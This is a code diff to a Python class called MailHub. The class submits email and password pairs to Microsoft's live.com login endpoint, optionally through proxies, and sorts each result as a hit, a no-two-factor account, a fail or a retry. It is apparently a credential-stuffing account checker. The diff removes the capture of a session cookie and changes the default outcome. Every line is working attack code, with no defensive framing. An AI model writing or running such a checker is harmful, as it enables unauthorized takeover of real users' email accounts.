@@ -76,46 +76,46 @@ class MailHub:
                 r = session.post("https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216", headers=self.headersMICROSOFT, data=self.payloadMICROSOFT(email, password), timeout=100)
 
                 if self.found(self.hitsMICROSOFT, r.text):
-                    return ["ok", r.cookies.get("X-OWA-CANARY")]
+                    return "ok"
 
                 if self.found(self.nfaMICROSOFT, r.text):
-                    return ["nfa"]
+                    return "nfa"
             
                 if self.found(self.customMICROSOFT, r.text):
-                    return ["custom"]
+                    return "custom"
                 
                 if self.found(self.failMICROSOFT, r.text):
-                    return ["fail"]
-
+                    return "fail"
+                    
                 if self.found(self.retryMICROSOFT, r.text):
-                    return ["retry"]
+                    return "retry"
                 
-                return ["ok", r.cookies.get("X-OWA-CANARY")]
+                return "fail"
 
             except:
-                return ["retry"]
+                return "retry"
         else:
             try:
                 r = session.post("https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216", headers=self.headersMICROSOFT, data=self.payloadMICROSOFT(email, password), timeout=200, proxies=proxy)
 
                 if self.found(self.hitsMICROSOFT, r.text):
-                    return ["ok", r.cookies.get("X-OWA-CANARY")]
+                    return "ok"
 
                 if self.found(self.nfaMICROSOFT, r.text):
-                    return ["nfa"]
+                    return "nfa"
             
                 if self.found(self.customMICROSOFT, r.text):
-                    return ["custom"]
+                    return "custom"
                 
                 if self.found(self.failMICROSOFT, r.text):
-                    return ["fail"]
+                    return "fail"
 
                 if self.found(self.retryMICROSOFT, r.text):
-                    return ["retry"]
+                    return "retry"
                 
-                return ["ok", r.cookies.get("X-OWA-CANARY")]
+                return "fail"
 
             except:
-                return ["retry"]
+                return "retry"
             
     # ----------------------------------------------------- #
